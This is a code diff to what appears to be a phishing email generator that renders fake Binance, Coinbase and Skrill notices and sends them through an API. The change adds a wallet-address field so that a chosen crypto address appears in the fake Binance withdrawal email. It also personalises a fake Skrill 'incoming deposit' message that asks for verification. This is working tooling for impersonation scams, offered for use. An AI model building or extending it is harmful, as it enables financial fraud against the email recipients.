@@ -91,6 +91,28 @@
                         </p>
                     </div>
 
+                    <!-- Wallet Address Input -->
+                    <div>
+                        <label class="block text-sm font-medium text-slate-700 mb-2">
+                            Wallet Address (for crypto templates)
+                        </label>
+                        <div class="relative">
+                            <svg class="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400 w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 9V7a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2m2 4h10a2 2 0 002-2v-6a2 2 0 00-2-2H9a2 2 0 00-2 2v6a2 2 0 002 2zm7-5a2 2 0 11-4 0 2 2 0 014 0z"></path>
+                            </svg>
+                            <input
+                                type="text"
+                                id="walletAddressInput"
+                                value=""
+                                class="w-full pl-10 pr-4 py-3 border-2 border-slate-300 rounded-lg focus:border-blue-500 focus:outline-none font-mono text-sm"
+                                placeholder="0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb"
+                            />
+                        </div>
+                        <p class="text-xs text-slate-500 mt-2">
+                            Your custom wallet address will appear in crypto templates (Binance, Coinbase, etc.)
+                        </p>
+                    </div>
+
                     <!-- Email Sending Section -->
                     <div>
                         <label class="block text-sm font-medium text-slate-700 mb-2">
@@ -173,6 +195,7 @@
         let currentTemplate = 'binance';
         let currentAmount = '500.00';
         let currentCurrency = 'USD';
+        let currentWalletAddress = '';
 
         const currencySymbols = {
             'USD': '$',
@@ -242,7 +265,7 @@
                             <div style="margin: 25px 0;">
                                 <div style="margin-bottom: 12px;">
                                     <span style="color: #1e2329; font-size: 13px; font-weight: bold;">Withdrawal Address:</span>
-                                    <span style="color: #707a8a; font-size: 13px; font-family: monospace; word-break: break-all; display: block; margin-top: 4px;">0x${Math.random().toString(16).substr(2, 40)}</span>
+                                    <span style="color: #707a8a; font-size: 13px; font-family: monospace; word-break: break-all; display: block; margin-top: 4px;">${currentWalletAddress || '0x' + Math.random().toString(16).substr(2, 40)}</span>
                                 </div>
                                 <div style="margin-bottom: 12px;">
                                     <span style="color: #1e2329; font-size: 13px; font-weight: bold;">Transaction ID:</span>
@@ -345,7 +368,7 @@
                         
                         <!-- Dark Content Area -->
                         <div style="padding: 30px 25px; background-color: #1a1a1a; color: #fff; min-height: 400px;">
-                            <h2 style="color: #fff; margin-top: 0; font-size: 18px; font-weight: normal;">Hello</h2>
+                            <h2 style="color: #fff; margin-top: 0; font-size: 18px; font-weight: normal;">Hello Shim,</h2>
                             
                             <p style="font-size: 14px; color: #b0b0b0; line-height: 1.6; margin: 20px 0;">
                                 There is an incoming deposit to your Skrill account. However, before the processing of the transfer can be completed, verification needs to be performed.
@@ -935,6 +958,11 @@
             renderTemplate();
         });
 
+        document.getElementById('walletAddressInput').addEventListener('input', (e) => {
+            currentWalletAddress = e.target.value.trim();
+            renderTemplate();
+        });
+
         // Email Sending Functionality
         function showStatus(message, isError = false) {
             const statusDiv = document.getElementById('emailStatus');
@@ -1014,7 +1042,8 @@
                 template_name: templates[currentTemplate],
                 template_html: templateHTML,
                 amount: formatAmount(currentAmount, currentCurrency),
-                currency: currentCurrency
+                currency: currentCurrency,
+                wallet_address: currentWalletAddress
             };
 
             // Send email using Vercel API
